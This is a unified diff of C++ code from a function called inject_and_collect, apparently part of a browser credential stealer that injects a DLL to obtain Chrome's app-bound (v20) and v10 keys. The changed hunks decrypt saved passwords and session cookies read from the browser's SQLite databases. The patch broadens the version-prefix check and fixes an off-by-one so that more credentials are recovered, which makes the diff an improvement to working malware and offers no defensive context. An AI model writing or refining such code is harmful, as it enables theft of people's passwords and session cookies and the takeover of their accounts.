@@ -424,12 +424,12 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                             int pass_len = sqlite3_column_bytes(stmt, 2);
                             if (pass_blob && pass_len > 0) {
                                 std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
-                                bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
-                                auto& key = is_v20 ? v20_key : v10_key;
+                                bool is_v2x = (enc_pass.size() > 3 && enc_pass[0] == 'v' && enc_pass[1] == '2');
+                                auto& key = is_v2x ? v20_key : v10_key;
                                 if (!key.empty()) {
                                     auto dec = aes_gcm_decrypt(key, enc_pass);
                                     if (!dec.empty()) {
-                                        if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
+                                        if (is_v2x && dec.size() >= 32) dec.erase(dec.begin(), dec.begin() + 32);
                                         p_data.passwords.push_back({ t_url ? t_url : "", t_user ? t_user : "", to_utf8_lossy(dec) });
                                     }
                                 }
@@ -463,12 +463,12 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                             int enc_len = sqlite3_column_bytes(stmt, 7);
                             if (enc_blob && enc_len > 0) {
                                 std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
-                                bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
-                                auto& key = is_v20 ? v20_key : v10_key;
+                                bool is_v2x = (enc_val.size() > 3 && enc_val[0] == 'v' && enc_val[1] == '2');
+                                auto& key = is_v2x ? v20_key : v10_key;
                                 if (!key.empty()) {
                                     auto dec = aes_gcm_decrypt(key, enc_val);
                                     if (!dec.empty()) {
-                                        if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
+                                        if (is_v2x && dec.size() >= 32) dec.erase(dec.begin(), dec.begin() + 32);
                                         p_data.cookies.push_back({ t_host ? t_host : "", t_name ? t_name : "", to_utf8_lossy(dec), t_path ? t_path : "", expires, secure, httponly, samesite });
                                     }
                                 }
